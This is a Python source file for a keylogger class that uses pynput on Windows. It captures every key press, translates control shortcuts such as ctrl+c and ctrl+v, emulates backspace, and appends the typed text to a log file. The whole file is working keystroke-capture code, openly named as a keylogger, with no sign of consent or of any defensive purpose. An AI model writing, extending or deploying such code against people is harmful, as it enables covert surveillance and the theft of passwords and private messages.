import os
from threading import Thread

from pynput.keyboard import Listener
from pynput.keyboard._win32 import KeyCode

from .interfaces import KeyloggerBase
from .log_handler import LogHandler


class Keylogger(KeyloggerBase):
    """
    Captures key presses from keyboard
    """
    def __init__(self, log_handler: LogHandler) -> None:
        self.keys_mapping = {
            "Key.space": " ",
            "Key.enter": " [ENTER] ",
            r"\x03": " [ctrl+c] ",
            r"\x16": " [ctrl+v] ",
            r"\x18": " [ctrl+x] ",
            r"\x1a": " [ctrl+z] ",
            r"\x01": " [ctrl+a] ",
            r"\x13": " [ctrl+s] ",
            r"\x12": " [ctrl+r] ",
            r"\x19": " [ctrl+y] ",
            r"\x06": " [ctrl+f] "

        }
        self.log_handler = log_handler

    def start_listener(self) -> None:
        """
        Starts pynput listener thread that listens on key presses
        """
        Thread(target=self._start_listener).start()

    def _start_listener(self) -> None:
        self.log_handler.add_header()
        self.log_handler.start_datetime_writer()
        with Listener(on_press=self._on_key_press) as listener:
            listener.join()

    def _on_key_press(self, pressed_key: KeyCode) -> None:
        """
        Handles specific actions such as saving to file after key press detection
        :param pressed_key: A key that has been pressed (or possibly a keyboard shortcut)
        """
        pressed_key = str(pressed_key).replace("'", "")
        with open(self.log_handler.file, self.log_handler.open_mode) as log:
            if pressed_key in self.keys_mapping:
                log.write(self.keys_mapping[pressed_key])
            elif pressed_key == "Key.backspace":  # Backspace functionality (like in text editor)
                self._handle_backspace()
            elif pressed_key.find("Key") == -1:
                log.write(pressed_key)

    def _handle_backspace(self) -> None:
        """
        Adds backspace functionality that works like in text editor
        """
        self.log_handler.open_mode = "rb+"
        with open(self.log_handler.file, self.log_handler.open_mode) as log:
            log.seek(-1, os.SEEK_END)
            log.truncate()
        self.log_handler.open_mode = "a+"
